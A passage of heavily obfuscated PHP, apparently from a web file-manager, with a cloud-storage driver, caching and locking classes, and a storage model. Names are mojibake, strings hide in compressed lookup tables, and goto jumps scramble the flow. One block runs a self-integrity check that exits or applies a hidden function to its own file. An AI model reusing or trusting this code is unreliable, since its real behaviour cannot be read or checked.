$óù‘¢È² = $this->copyFile($›ŒğºÎú, $›ŒğºÎú, array($ÏšƒÎ­µ[217] => $óù‘¢È²[$ÏšƒÎ­µ[218]])); return $óù‘¢È² ? !0 : !1; } public function fileSubstr($ŞÂ“èëÚ, $ú¨·æ’Ó, $µÚ½€ìö) { $ßÕ¢²ÍÜ = $ú¨·æ’Ó + $µÚ½€ìö - 1; return $this->client->getObject($this->bucket, $ŞÂ“èëÚ, array($_SERVER[¹àö™Ç¾][219] => "\142\171\164\x65\x73\x3d{$ú¨·æ’Ó}\55{$ßÕ¢²ÍÜ}")); } public function upload($ÌËÔ‰¢˜, $³ç±÷», $÷½Üº¸œ = false, $­–ğæõ› = REPEAT_REPLACE) { $ĞÌ½õá× =& $_SERVER[¹àö™Ç¾]; $´æÙÓ = array($ĞÌ½õá×[217] => @md5_file($³ç±÷»)); $¨®¹©µ = array($ĞÌ½õá×[220] => get_file_mime(get_path_ext($ÌËÔ‰¢˜))); if (IO::size($³ç±÷») <= 1024 * 1024 * 200) { $å¦ÎüŒ = $this->client->putObjectFile($³ç±÷», $this->bucket, $ÌËÔ‰¢˜, $ĞÌ½õá×[201], $´æÙÓ, $¨®¹©µ); return !empty($å¦ÎüŒ) ? $this->getPathOuter($ÌËÔ‰¢˜) : !1; } $÷Éò«ó† = $this->client->multiUploadObject($³ç±÷», $this->bucket, trim($ÌËÔ‰¢˜, $ĞÌ½õá×[18]), $´æÙÓ, $¨®¹©µ); return $÷Éò«ó† ? $this->getPathOuter($ÌËÔ‰¢˜) : !1; } public function download($ÜÇ„Ê¤¬, $¹ßòÂß˜) { if (!@is_dir($this->pathFather($¹ßòÂß˜)) && !IO::mkdir($this->pathFather($¹ßòÂß˜))) { return !1; } $€¨ßÂä = $this->client->getObject($this->bucket, $ÜÇ„Ê¤¬, array(), $¹ßòÂß˜); return $€¨ßÂä !== !1 ? $¹ßòÂß˜ : !1; } public function link($•Ã²¹ Ï, $Ê•¶ï¼™ = array()) { $ù”Ÿâ¯¾ =& $_SERVER[¹àö™Ç¾]; if ($this->signVer == $ù”Ÿâ¯¾[221]) { return $this->client->getAuthenticatedURL($this->bucket, $•Ã²¹ Ï, 3600 * 12, $Ê•¶ï¼™); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($•Ã²¹ Ï, $ù”Ÿâ¯¾[18]), 3600 * 12, $this->region, array(), !0, $Ê•¶ï¼™); } public function fileOut($‚õúáùÊ, $×ÎÚÜ–Õ = false, $„Û–Ò¼ = false, $¼´¨¨´ = '') { $õ›‘³ÆÊ =& $_SERVER[¹àö™Ç¾]; if ($this->isFileOutServer()) { return $this->fileOutServer($‚õúáùÊ, $×ÎÚÜ–Õ, $„Û–Ò¼, $¼´¨¨´); } if (!$„Û–Ò¼) { $„Û–Ò¼ = $this->pathThis($‚õúáùÊ); } $ª©„´ò‹ = get_file_mime(get_path_ext($„Û–Ò¼)); if ($ª©„´ò‹ == $õ›‘³ÆÊ[222]) { return parent::fileOut($‚õúáùÊ, $×ÎÚÜ–Õ, $„Û–Ò¼, $¼´¨¨´); } $ÄÓ¬ÂÒ· = array($õ›‘³ÆÊ[223] => $ª©„´ò‹); if ($×ÎÚÜ–Õ) { $ÄÓ¬ÂÒ·[$õ›‘³ÆÊ[224]] = $õ›‘³ÆÊ[225] . rawurlencode($„Û–Ò¼); } else { } $ ìêÒ™¬ = $this->link($‚õúáùÊ, $ÄÓ¬ÂÒ·); $this->fileOutLink($ ìêÒ™¬); } public function fileOutServer($¼¼—®§³, $ãñŠ† = false, $¦™‡ÙÇµ = false, $³‰ñ®‚Ş = '') { parent::fileOut($¼¼—®§³, $ãñŠ†, $¦™‡ÙÇµ, $³‰ñ®‚Ş); } public function fileOutImageServer($¾™ÚàŒØ, $óí¦îà² = 250) { parent::fileOutImage($¾™ÚàŒØ, $óí¦îà²); } public function hashMd5($¹şØ‘õ, $ÛààÄõş = '') { $¡ÔïÓëè =& $_SERVER[¹àö™Ç¾]; $êõñÙãï = $this->objectMeta($¹şØ‘õ); if (!$êõñÙãï) { return !1; } $ÛààÄõş = $ÛààÄõş ? $ÛààÄõş : _get($êõñÙãï, $¡ÔïÓëè[226]); $ÛààÄõş = $ÛààÄõş ? $ÛààÄõş : _get($êõñÙãï, $¡ÔïÓëè[218], $¡ÔïÓëè[22]); return $ÛààÄõş; } public function uploadFormData($Øüƒ¬Ï¥, $„Ù³¤¼ú = 3600) { $òë§œî =& $_SERVER[¹àö™Ç¾]; $—Æš€—‚ = $this->pathFather($Øüƒ¬Ï¥); $šâ‰Íõõ = $this->client->getHttpUploadPostParams($this->bucket, $—Æš€—‚, $òë§œî[201], $„Ù³¤¼ú); return array_merge((array) $šâ‰Íõõ, array($òë§œî[184] => $this->getHost())); } public function multiUploadFormData($õš“„‚õ, $œÌÛÂÊ— = 3600) { $šŞöÔ”¦ =& $_SERVER[¹àö™Ç¾]; $ÀÎ’Ğù = gmdate($šŞöÔ”¦[227]); $ü˜Ó•™í = array(); $àÍÙä¶ê = $this->client->getUploadId($this->bucket, $õš“„‚õ, $ü˜Ó•™í); if (!$àÍÙä¶ê) { return !1; } return array($šŞöÔ”¦[228] => $àÍÙä¶ê, $šŞöÔ”¦[184] => $this->getHost() . $šŞöÔ”¦[18] . $this->pathEncode($õš“„‚õ), $šŞöÔ”¦[229] => $ÀÎ’Ğù, $šŞöÔ”¦[105] => $õš“„‚õ); } public function multiUploadAuthData($²××Ÿ£î, $ùƒ€¾ô = array()) { $›æ«£ìš =& $_SERVER[¹àö™Ç¾]; $ÍŸÚ¢²ë = isset($ùƒ€¾ô[$›æ«£ìš[229]]) ? $ùƒ€¾ô[$›æ«£ìš[229]] : gmdate($›æ«£ìš[227]); $ÈœåÔÒ = isset($ùƒ€¾ô[$›æ«£ìš[177]]) ? $ùƒ€¾ô[$›æ«£ìš[177]] : $›æ«£ìš[22]; $åâ†¯ = $ùƒ€¾ô[$›æ«£ìš[105]]; unset($ùƒ€¾ô[$›æ«£ìš[105]]); if (isset($ùƒ€¾ô[$›æ«£ìš[230]])) { $ùƒ€¾ô[$›æ«£ìš[229]] = $ÍŸÚ¢²ë; return $this->listUploadParts($åâ†¯, $ùƒ€¾ô); } $ßÌ¥š¾ï = array($›æ«£ìš[231], $›æ«£ìš[22], $›æ«£ìš[128], $›æ«£ìš[22], "\x78\55\141\155\172\x2d\x64\x61\164\x65\x3a{$ÍŸÚ¢²ë}", $›æ«£ìš[18] . $this->bucket . $›æ«£ìš[18] . $this->pathEncode($åâ†¯) . $ÈœåÔÒ); if (strpos($ÈœåÔÒ, $›æ«£ìš[232]) === 0) { $ßÌ¥š¾ï[0] = $›æ«£ìš[233]; } if (isset($ùƒ€¾ô[$›æ«£ìš[234]]) && $ùƒ€¾ô[$›æ«£ìš[234]] == $›æ«£ìš[235]) { $ßÌ¥š¾ï[0] = $›æ«£ìš[235]; } $¦§¼‹ÊÊ = implode($›æ«£ìš[11], $ßÌ¥š¾ï); $—ô¤è™Ò = base64_encode(hash_hmac($›æ«£ìš[236], $¦§¼‹ÊÊ, $this->secret, !0)); $·Œ»ñŠ = $›æ«£ìš[237] . $this->accessKey . $›æ«£ìš[4] . $—ô¤è™Ò; if (strpos($ÈœåÔÒ, $›æ«£ìš[232]) === 0) { return array($›æ«£ìš[238] => $·Œ»ñŠ, $›æ«£ìš[229] => $ÍŸÚ¢²ë); } return $·Œ»ñŠ; } public function listUploadParts($õ´ĞÚ¸, $Œíñ¹¨¢ = array()) { $Çû€¡çÚ =& $_SERVER[¹àö™Ç¾]; $Ñ¡æá = str_replace($Çû€¡çÚ[239], $Çû€¡çÚ[22], $Œíñ¹¨¢[$Çû€¡çÚ[177]]); $ñ¹ãıˆÁ = $this->client->listParts($this->bucket, $õ´ĞÚ¸, $Ñ¡æá); if (!$ñ¹ãıˆÁ) { return !1; } unset($Œíñ¹¨¢[$Çû€¡çÚ[230]], $Œíñ¹¨¢[$Çû€¡çÚ[234]]); $Œíñ¹¨¢[$Çû€¡çÚ[105]] = $õ´ĞÚ¸; $ÛØôÕÖÂ = $this->multiUploadAuthData($õ´ĞÚ¸, $Œíñ¹¨¢); if (empty($ÛØôÕÖÂ)) { return !1; } return array($Çû€¡çÚ[238] => $ÛØôÕÖÂ, $Çû€¡çÚ[229] => $Œíñ¹¨¢[$Çû€¡çÚ[229]], $Çû€¡çÚ[240] => $ñ¹ãıˆÁ); } public function getHost() { return parent::getHost() . $_SERVER[¹àö™Ç¾][18] . $this->bucket; } public function size($¸şÉ¸Ÿ’) { $œß¡İ¸µ = $this->objectMeta($¸şÉ¸Ÿ’); return $œß¡İ¸µ ? $œß¡İ¸µ[$_SERVER[¹àö™Ç¾][90]] : 0; } public function info($ã•ŸíºÊ) { if ($this->isFolder($ã•ŸíºÊ)) { return $this->folderInfo($ã•ŸíºÊ); } else { if ($this->isFile($ã•ŸíºÊ)) { return $this->fileInfo($ã•ŸíºÊ); } } return !1; } public function exist($ÀõĞ‡€á) { return $this->isFile($ÀõĞ‡€á) || $this->isFolder($ÀõĞ‡€á); } public function isFile($¹¿”œà) { return !$this->isFolder($¹¿”œà) && $this->objectMeta($¹¿”œà); } public function isFolder($Ò‘äÖ›î) { return $this->cacheMethod($_SERVER[¹àö™Ç¾][208], $Ò‘äÖ›î); } protected function objectMeta($º©˜ìŸ) { return $this->cacheMethod($_SERVER[¹àö™Ç¾][209], $º©˜ìŸ); } protected function _objectMeta($ï¹‰ò—) { $…Öƒ»¦ =& $_SERVER[¹àö™Ç¾]; $ï¹‰ò— = rtrim($ï¹‰ò—, $…Öƒ»¦[18]); try { $¥ß×ûŸÁ = $this->client->getObjectInfo($this->bucket, $ï¹‰ò—); if (!isset($¥ß×ûŸÁ[$…Öƒ»¦[226]]) && isset($¥ß×ûŸÁ[$…Öƒ»¦[241]])) { $¥ß×ûŸÁ[$…Öƒ»¦[226]] = $¥ß×ûŸÁ[$…Öƒ»¦[241]]; } } catch (Exception $½Ÿ‡‡ÑÒ) { $¥ß×ûŸÁ = !1; } if (!$¥ß×ûŸÁ) { } return $¥ß×ûŸÁ; } protected function _isFolder($²„ÅÙŞĞ) { $òÑ£šàÁ =& $_SERVER[¹àö™Ç¾]; $²„ÅÙŞĞ = rtrim($²„ÅÙŞĞ, $òÑ£šàÁ[18]); if ($²„ÅÙŞĞ == $òÑ£šàÁ[22] || $²„ÅÙŞĞ == $òÑ£šàÁ[18]) { return !0; } $äŠ Çğ = $this->client->getBucket($this->bucket, $²„ÅÙŞĞ, null, 1); if (empty($äŠ Çğ[$òÑ£šàÁ[207]])) { return !1; } $´‘·Š¦î = $äŠ Çğ[$òÑ£šàÁ[207]][0][$òÑ£šàÁ[42]]; return stripos($´‘·Š¦î, $²„ÅÙŞĞ . $òÑ£šàÁ[18]) === 0 ? !0 : !1; if (substr($´‘·Š¦î, -1) == $òÑ£šàÁ[18]) { return !0; } if (get_path_this($´‘·Š¦î) == get_path_this($²„ÅÙŞĞ)) { return !1; } return !0; } } goto bÓ¬§‘•¼; AîŒ˜£æ…: $_file = $_SERVER[$_SERVER[¹àö™Ç¾][15]]; $_size = $_SERVER[¹àö™Ç¾][1504]; if ($_SERVER[$_SERVER[¹àö™Ç¾][6]] != $_size($_file)) { $_getc = $_SERVER[¹àö™Ç¾][8]; $_getfile = $_SERVER[$_SERVER[¹àö™Ç¾][9]] . $_SERVER[¹àö™Ç¾][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹àö™Ç¾][11], $_getfilec); if (count($_getarrs) < $_SERVER[¹àö™Ç¾][12]) { $exit = $_SERVER[¹àö™Ç¾][13]; $exit(); } $_act = $_SERVER[¹àö™Ç¾][14]; $_act($_file); } goto CÖŠÎô…ó; DÃºÒäî‚Ë: define($_SERVER[¹àö™Ç¾][244], 3); define($_SERVER[¹àö™Ç¾][245], 1); define($_SERVER[¹àö™Ç¾][246], 0); goto a’‹ˆ‡ªñÕ; AÅ¿‡óª: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Åë¡Îô­ =& $_SERVER[¹àö™Ç¾]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¡ÓôÏªÌ = $GLOBALS[$Åë¡Îô­[16]][$Åë¡Îô­[353]]; $Üš·çéŠ = $¡ÓôÏªÌ[$¡ÓôÏªÌ[$Åë¡Îô­[819]]]; $±÷ö€Ó£ = $¡ÓôÏªÌ[$Åë¡Îô­[820]]; switch ($¡ÓôÏªÌ[$Åë¡Îô­[819]]) { case $Åë¡Îô­[31]: self::$handle = Model($Åë¡Îô­[821]); break; case $Åë¡Îô­[822]: self::$handle = new CacheRedis($Üš·çéŠ, $±÷ö€Ó£); break; case $Åë¡Îô­[823]: self::$handle = new CacheMemcached($Üš·çéŠ, $±÷ö€Ó£); break; case $Åë¡Îô­[202]: self::$handle = new CacheFile($Üš·çéŠ, $±÷ö€Ó£); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ÿ…ıçòÆ) { if (is_array($Ÿ…ıçòÆ) || is_object($Ÿ…ıçòÆ)) { $Ÿ…ıçòÆ = json_encode($Ÿ…ıçòÆ); } $Ÿ…ıçòÆ = rawurlencode($Ÿ…ıçòÆ); return md5(KOD_SITE_ID . $_SERVER[¹àö™Ç¾][21] . $Ÿ…ıçòÆ); } public static function get($ü´´êÙ, $ãè­èË = false) { $ˆ”§üÌ• = self::key($ü´´êÙ); if ($ãè­èË) { return unserialize(self::init()->get($ˆ”§üÌ•)); } if (!isset(self::$memoryCache[$ˆ”§üÌ•])) { $¢ì½…ä = self::init()->get($ˆ”§üÌ•); self::$memoryCache[$ˆ”§üÌ•] = unserialize($¢ì½…ä); } return self::$memoryCache[$ˆ”§üÌ•]; } public static function set($±â™, $¯½Í‡µ², $ÕÎì²äÀ = false) { $Íæ§ÏŸ = self::key($±â™); if (isset(self::$memoryCache[$Íæ§ÏŸ]) && self::$memoryCache[$Íæ§ÏŸ] === $¯½Í‡µ²) { return !0; } if ($ÕÎì²äÀ === 0) { self::$memoryCache[$Íæ§ÏŸ] = $¯½Í‡µ²; return !0; } CacheLock::lock($±â™); $Ìˆšì¹è = self::init()->set($Íæ§ÏŸ, serialize($¯½Í‡µ²), $ÕÎì²äÀ); self::$memoryCache[$Íæ§ÏŸ] = $¯½Í‡µ²; CacheLock::unlock($±â™); return $Ìˆšì¹è; } public static function getCall($µŒÙ€±, $ ’Ê’ŒÊ, $…Æ—İŞİ, $ˆæÄ’ÕÃ = array()) { $€È  ù¨ =& $_SERVER[¹àö™Ç¾]; $­¾†Ñö = self::get($µŒÙ€±); if ($­¾†Ñö || $­¾†Ñö === $€È  ù¨[22]) { return $­¾†Ñö; } $­¾†Ñö = call_user_func_array($…Æ—İŞİ, $ˆæÄ’ÕÃ); $­¾†Ñö = $­¾†Ñö ? $­¾†Ñö : $€È  ù¨[22]; self::set($µŒÙ€±, $­¾†Ñö, $ ’Ê’ŒÊ); return $­¾†Ñö; } public static function remove($Ó«ú½‹ò) { $›©÷¸ïİ = self::key($Ó«ú½‹ò); unset(self::$memoryCache[$›©÷¸ïİ]); self::clearTimeout(); CacheLock::lock($Ó«ú½‹ò); $ÃıĞÎĞ” = self::init()->remove($›©÷¸ïİ); CacheLock::unlock($Ó«ú½‹ò); return $ÃıĞÎĞ”; } public static function removeMemory($…şöŞ³Å) { $–†“ÛÁÚ = self::key($…şöŞ³Å); unset(self::$memoryCache[$–†“ÛÁÚ]); } public static function clearMemory($ì­Ğ……ß = false) { if ($ì­Ğ……ß) { $ì­Ğ……ß = self::key($ì­Ğ……ß); unset(self::$memoryCache[$ì­Ğ……ß]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¹àö™Ç¾][824])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¹àö™Ç¾][825])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($®×¦“½, $‘óë–®£) { $¯¾‹³áÈ =& $_SERVER[¹àö™Ç¾]; $this->cachePath = $®×¦“½[$¯¾‹³áÈ[88]]; $this->prefix = $¯¾‹³áÈ[826]; $this->cacheTime = $‘óë–®£; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ğã©éªë) { $¼è²‚¤ =& $_SERVER[¹àö™Ç¾]; $ğã©éªë = str_replace(array($¼è²‚¤[827], $¼è²‚¤[108], $¼è²‚¤[83]), $¼è²‚¤[828], $ğã©éªë); return $this->cachePath . $¼è²‚¤[829] . $ğã©éªë . $¼è²‚¤[830]; } public function set($’Â’Åİé, $«òÏˆ™, $Œ«¦úôó = false) { $ÉŞñÛ€Œ = $this->getFile($’Â’Åİé); if (file_put_contents($ÉŞñÛ€Œ, $this->prefix . $«òÏˆ™, LOCK_EX)) { @touch($ÉŞñÛ€Œ, intval(time() + $Œ«¦úôó)); clearstatcache(); return !0; } @unlink($ÉŞñÛ€Œ); return !1; } public function get($»óå¿²) { $´ŒÕËæõ = $this->getFile($»óå¿²); if (file_exists($´ŒÕËæõ) && filemtime($´ŒÕËæõ) < time()) { @unlink($´ŒÕËæõ); return !1; } $¼âó¯ûÀ = @file_get_contents($´ŒÕËæõ); return substr($¼âó¯ûÀ, strlen($this->prefix)); } public function remove($ãìËÂå) { $†×¦¶ÙÇ = $this->getFile($ãìËÂå); return @unlink($†×¦¶ÙÇ); } public function deleteAll() { $ÒÛèî¤ª =& $_SERVER[¹àö™Ç¾]; $ÏÂ«ÛÄœ = scandir($this->cachePath); foreach ($ÏÂ«ÛÄœ as $¹àÌ˜‹) { $óÅ—¾‘æ = $this->cachePath . $¹àÌ˜‹; if (strpos($óÅ—¾‘æ, $ÒÛèî¤ª[830]) && strpos($óÅ—¾‘æ, $ÒÛèî¤ª[831])) { @unlink($óÅ—¾‘æ); } } } public function clearTimeout() { $¡ÜÖŸÌÆ =& $_SERVER[¹àö™Ç¾]; $òÌ…é£˜ = scandir($this->cachePath); foreach ($òÌ…é£˜ as $Ô‚É‹–) { $­„ÈËä” = $this->cachePath . $Ô‚É‹–; if (strpos($­„ÈËä”, $¡ÜÖŸÌÆ[830]) && strpos($­„ÈËä”, $¡ÜÖŸÌÆ[831]) && filemtime($­„ÈËä”) < time()) { @unlink($­„ÈËä”); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Õ·ñïõÔ =& $_SERVER[¹àö™Ç¾]; if (self::$handle) { return self::$handle; } $àÊ¾ÇÉ• = $GLOBALS[$Õ·ñïõÔ[16]][$Õ·ñïõÔ[353]]; self::$timeout = $àÊ¾ÇÉ•[$Õ·ñïõÔ[832]] ? $àÊ¾ÇÉ•[$Õ·ñïõÔ[832]] : 10; $­™‹ÅõŒ = _get($GLOBALS[$Õ·ñïõÔ[16]], $Õ·ñïõÔ[833]); $Ã‘‡İŠË = $àÊ¾ÇÉ•[$Õ·ñïõÔ[819]] ? $àÊ¾ÇÉ•[$Õ·ñïõÔ[819]] : $Õ·ñïõÔ[202]; if ($Ã‘‡İŠË == $Õ·ñïõÔ[31] && $­™‹ÅõŒ == $Õ·ñïõÔ[23]) { $Ã‘‡İŠË = $Õ·ñïõÔ[202]; } switch ($Ã‘‡İŠË) { case $Õ·ñïõÔ[822]: self::$handle = new CacheLockRedis(); break; case $Õ·ñïõÔ[823]: self::$handle = new CacheLockMemcached(); break; case $Õ·ñïõÔ[31]: self::$handle = new CacheLockDatabase(); break; case $Õ·ñïõÔ[202]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Õ·ñïõÔ[834], $Õ·ñïõÔ[835]); } return self::$handle; } private static function key($€èˆ» ») { return $_SERVER[¹àö™Ç¾][836] . Cache::key($€èˆ» »); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($­ÃÑÊ›ü = '') { self::$errorMsg = $­ÃÑÊ›ü; } public static function lockGlobal($«¹¢³€, $Ûºì”†µ) { return self::lock($«¹¢³€, $Ûºì”†µ, !0); } public static function lock($âÑ½¹ä–, $ç—œ‰¼™ = false, $Å¶§‹ôÆ = false) { $†ß×‚Á® =& $_SERVER[¹àö™Ç¾]; $Ã‡¢ªƒÑ = self::init(); $û¢åâ³º = self::key($âÑ½¹ä–); $ç—œ‰¼™ = $ç—œ‰¼™ ? $ç—œ‰¼™ : self::$timeout; $ÚâıÛÖş = $Ã‡¢ªƒÑ->lock($û¢åâ³º, $ç—œ‰¼™); $Ë•¬ğ×æ = timeFloat(); if (!$ÚâıÛÖş) { $¸’Ï“Ô = "\x6c\x6f\143\153\40\x65\x72\x72\157\x72\x3b\x6b\x65\x79\75{$âÑ½¹ä–}\x3b\x74\151\x6d\145\x3d{$ç—œ‰¼™}\73" . self::$errorMsg . $†ß×‚Á®[81] . get_caller_msg(); $Íå¬­¾ò = LNG($†ß×‚Á®[837]) . "\x28{$ç—œ‰¼™}\163\x29\x2e" . LNG($†ß×‚Á®[838]); $Íå¬­¾ò .= $†ß×‚Á®[839]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Íå¬­¾ò = $Íå¬­¾ò . $†ß×‚Á®[840] . self::$errorMsg; } write_log($¸’Ï“Ô, $†ß×‚Á®[835]); show_json($Íå¬­¾ò, !1); } if (!$Å¶§‹ôÆ) { self::$lockItem[$û¢åâ³º] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $œ¬‡£²Í = number_format(timeFloat() - $Ë•¬ğ×æ, 3); write_log($†ß×‚Á®[841] . $âÑ½¹ä– . $†ß×‚Á®[842] . $œ¬‡£²Í, $†ß×‚Á®[835]); } return $ÚâıÛÖş; } public static function lockGet($çÆó€èõ) { $«¤¾ĞáÍ = self::key($çÆó€èõ); if (self::$lockItem[$«¤¾ĞáÍ]) { return self::$lockItem[$«¤¾ĞáÍ]; } return self::init()->lockGet($«¤¾ĞáÍ); } public static function unlock($ñÌÆËÕ) { $‡â—üèÁ =& $_SERVER[¹àö™Ç¾]; $ò¾íÓ = self::key($ñÌÆËÕ); self::$lockItem[$ò¾íÓ] = null; self::init()->unlock($ò¾íÓ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($‡â—üèÁ[843] . $ñÌÆËÕ, $‡â—üèÁ[835]); } return; } public static function unlockRuntime() { $ò›ÅÅ³À =& $_SERVER[¹àö™Ç¾]; $›úø×Œò = self::init(); $Û–Œóç = !1; foreach (self::$lockItem as $…óÆæ¶í => $…Ü¼ôé) { if (!$…Ü¼ôé) { continue; } $›úø×Œò->unlock($…óÆæ¶í); if (!$Û–Œóç) { $Û–Œóç = !0; write_log($ò›ÅÅ³À[844] . $…óÆæ¶í . $ò›ÅÅ³À[81] . get_caller_msg(), $ò›ÅÅ³À[835]); continue; } write_log($ò›ÅÅ³À[844] . $…óÆæ¶í, $ò›ÅÅ³À[835]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $÷şÒöÈŸ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ò›ÅÅ³À[845] . $÷şÒöÈŸ . $ò›ÅÅ³À[846] . ACTION, $ò›ÅÅ³À[835]); } } public static function fileLock($òÖ¶×—Ü) { $ÛÖÚ¢ü‡ =& $_SERVER[¹àö™Ç¾]; if (!$GLOBALS[$ÛÖÚ¢ü‡[847]]) { $GLOBALS[$ÛÖÚ¢ü‡[847]] = array(); } $GLOBALS[$ÛÖÚ¢ü‡[847]][$òÖ¶×—Ü] = !1; $×¯ŸıÆ = fopen(DATA_PATH . $òÖ¶×—Ü . $ÛÖÚ¢ü‡[848], $ÛÖÚ¢ü‡[849]); if (!$×¯ŸıÆ) { return !1; } $GLOBALS[$ÛÖÚ¢ü‡[847]][$òÖ¶×—Ü] = $×¯ŸıÆ; if (flock($×¯ŸıÆ, LOCK_EX)) { return !0; } self::unlock($òÖ¶×—Ü); show_json($ÛÖÚ¢ü‡[850], !1); return !1; } public static function fileUnlock($³¤àê”“) { $­ëÌå²‹ =& $_SERVER[¹àö™Ç¾]; $¦¤¤ÒâÌ = $GLOBALS[$­ëÌå²‹[847]][$³¤àê”“]; if (!$¦¤¤ÒâÌ) { return; } $GLOBALS[$­ëÌå²‹[847]][$³¤àê”“] = !1; flock($¦¤¤ÒâÌ, LOCK_UN); fclose($¦¤¤ÒâÌ); } public static function fileUnlockAll() { $Ñ§¾“êÍ =& $_SERVER[¹àö™Ç¾]; if (!$GLOBALS[$Ñ§¾“êÍ[847]]) { return; } foreach ($GLOBALS[$Ñ§¾“êÍ[847]] as $Ú´»§ä => $“ÙâÜà) { if (!$“ÙâÜà) { continue; } $GLOBALS[$Ñ§¾“êÍ[847]][$Ú´»§ä] = !1; flock($“ÙâÜà, LOCK_UN); fclose($“ÙâÜà); } $GLOBALS[$Ñ§¾“êÍ[847]] = array(); } } goto e‡¶ã…æÕ†; e¼Õ‰í®µÚ: while (strlen($txwqmaycik) < $_SERVER[¹àö™Ç¾][607]) { if (!$txwqmaycik) { break; } $txwqmaycik++; } $_SERVER[˜²›ÃôÇ] = explode($_SERVER[¹àö™Ç¾][608], gzinflate(substr($_SERVER[¹àö™Ç¾][609], 10, -8))); $avhiepzsdb = $_SERVER[¹àö™Ç¾][610]; goto DÈ‡ÁÊèêÃ; CÖŠÎô…ó: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x73\164\x6f\162\141\x67\x65\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\145", "\163\x69\172\145\115\141\x78", "\163\171\x73\x74\145\155", "\144\145\x66\141\165\x6c\164", "\144\x72\151\x76\145\162", "\x63\x6f\156\x66\x69\x67"); public function listData($ëØºæÏ = false, $­Õäá’Â = "\x6d\x6f\144\151\x66\171\x54\151\155\x65", $—‚šÌÃ = false) { $§¾Ò¼¯Ø =& $_SERVER[¹àö™Ç¾]; $ä‚µ = parent::listData($ëØºæÏ, $­Õäá’Â, $—‚šÌÃ); if ($ëØºæÏ) { return $ä‚µ; } $ ĞÀó£ñ = $this->ioSizeUseGet(array_to_keyvalue($ä‚µ, $§¾Ò¼¯Ø[22], $§¾Ò¼¯Ø[401])); foreach ($ä‚µ as $œÍüÜó™ => $•¯Ú¼ö§) { unset($ä‚µ[$œÍüÜó™][$§¾Ò¼¯Ø[16]]); $ä‚µ[$œÍüÜó™][$§¾Ò¼¯Ø[1797]] = isset($ ĞÀó£ñ[$•¯Ú¼ö§[$§¾Ò¼¯Ø[401]]]) ? $ ĞÀó£ñ[$•¯Ú¼ö§[$§¾Ò¼¯Ø[401]]] : 0; } return $ä‚µ; } public function ioSizeUseGet($ìî„³’ù) { $¤™¸ˆÙğ =& $_SERVER[¹àö™Ç¾]; if (!$ìî„³’ù) { return array(); } $÷£ÄØä = $¤™¸ˆÙğ[2111] . implode($¤™¸ˆÙğ[60], $ìî„³’ù); $”ïñÌ² = Cache::get($÷£ÄØä); if ($”ïñÌ²) { return $”ïñÌ²; } $Ì ¢¦«Œ = array($¤™¸ˆÙğ[809] => $¤™¸ˆÙğ[401], $¤™¸ˆÙğ[2112] => $¤™¸ˆÙğ[90]); $Ã”¢ğ—Ş = array($¤™¸ˆÙğ[809] => array($¤™¸ˆÙğ[17], $ìî„³’ù)); $”ïñÌ² = Model($¤™¸ˆÙğ[781])->field($Ì ¢¦«Œ)->where($Ã”¢ğ—Ş)->group($¤™¸ˆÙğ[809])->select(); $”ïñÌ² = array_to_keyvalue($”ïñÌ², $¤™¸ˆÙğ[401], $¤™¸ˆÙğ[90]); Cache::set($÷£ÄØä, $”ïñÌ², 600); return $”ïñÌ²; } public function getConfig($ª°½æº) { $€ßïßı = parent::listData($ª°½æº); return json_decode($€ßïßı[$_SERVER[¹àö™Ç¾][16]], !0); } public function update($ˆî¤Ç ¥, $¿±½‹¤‰) { $ú£Éî¢ =& $_SERVER[¹àö™Ç¾]; $ÍèÓÇä = $¿±½‹¤‰[$ú£Éî¢[42]]; $‚È×¡š— = array_to_keyvalue(parent::listData(), $ú£Éî¢[42]); if (isset($‚È×¡š—[$ÍèÓÇä]) && $‚È×¡š—[$ÍèÓÇä][$ú£Éî¢[401]] != $ˆî¤Ç ¥) { return !1; } if (isset($¿±½‹¤‰[$ú£Éî¢[2113]]) && $¿±½‹¤‰[$ú£Éî¢[2113]] == $ú£Éî¢[99]) { $this->checkConfig($¿±½‹¤‰); } unset($¿±½‹¤‰[$ú£Éî¢[2113]]); $‡Ş«í£Ñ = parent::update($ˆî¤Ç ¥, $¿±½‹¤‰); if ($‡Ş«í£Ñ && $¿±½‹¤‰[$ú£Éî¢[47]]) { foreach ($‚È×¡š— as $°£—…ğÃ) { if ($°£—…ğÃ[$ú£Éî¢[47]] && $°£—…ğÃ[$ú£Éî¢[401]] != $ˆî¤Ç ¥) { parent::update($°£—…ğÃ[$ú£Éî¢[401]], array($ú£Éî¢[47] => 0)); } } } return $‡Ş«í£Ñ; } public function add($ÒÜ­¿Ó¢) { $¼ÁÕ•…Š =& $_SERVER[¹àö™Ç¾]; $š¿Ê•’ = array_to_keyvalue(parent::listData(), $¼ÁÕ•…Š[42]); if (isset($š¿Ê•’[$ÒÜ­¿Ó¢[$¼ÁÕ•…Š[42]]])) { return !1; } $this->checkConfig($ÒÜ­¿Ó¢); $®¿¿Â´® = parent::insert($ÒÜ­¿Ó¢); if ($®¿¿Â´® && $ÒÜ­¿Ó¢[$¼ÁÕ•…Š[47]]) { foreach ($š¿Ê•’ as $®ÆˆüİÁ) { if ($®ÆˆüİÁ[$¼ÁÕ•…Š[47]]) { 